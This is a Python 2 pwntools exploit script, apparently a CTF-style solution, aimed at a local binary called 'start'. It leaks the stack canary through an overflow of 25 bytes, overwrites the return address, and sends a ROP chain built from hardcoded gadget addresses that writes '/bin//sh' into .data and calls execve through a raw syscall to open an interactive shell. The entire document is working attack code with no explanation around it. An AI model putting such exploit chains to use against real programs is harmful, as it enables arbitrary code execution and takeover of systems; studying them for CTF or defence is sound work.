#!/usr/bin/env python2
# this is the original script I wrote in python to make sure the exploit worked, then ported to ruby
from pwn import *

# offsets: canary: 24 (25), ret (40)
context.log_level = 'DEBUG'
r = process("start")
#r = process("linux_serverx64")
# leak stack canary

buf = "a" * 25 
r.send(buf)

r.recvuntil("a" * 25)
canary = "\x00" + r.recvn(7)
log.info("Leaked canary: " + enhex(canary))


buf = "a" * 24 + canary

while len(buf) != 40:
    buf += "b"

p = buf
p += p64(0x00000000004017f7) # pop rsi ; ret
p += p64(0x00000000006cc080) # @ .data
p += p64(0x000000000047a6e6) # pop rax ; pop rdx ; pop rbx ; ret
p += '/bin//sh'
p += p64(0x4141414141414141) # padding
p += p64(0x4141414141414141) # padding
p += p64(0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004017f7) # pop rsi ; ret
p += p64(0x00000000006cc088) # @ .data + 8
p += p64(0x000000000042732f) # xor rax, rax ; ret
p += p64(0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004005d5) # pop rdi ; ret
p += p64(0x00000000006cc080) # @ .data
p += p64(0x00000000004017f7) # pop rsi ; ret
p += p64(0x00000000006cc088) # @ .data + 8
#p += p64(0x0000000000443776) # pop rdx ; ret
p += p64(0x000000000047a6e6) # pop rax ; pop rdx ; pop rbx ; ret
p += p64(59) # execve syscall number
p += p64(0x00000000006cc088) # @ .data + 8
p += p64(0x4141414141414141) # padding
p += p64(0x0000000000468e75) # syscall ; ret
r.send(p)
r.sendline('exit')
r.interactive()
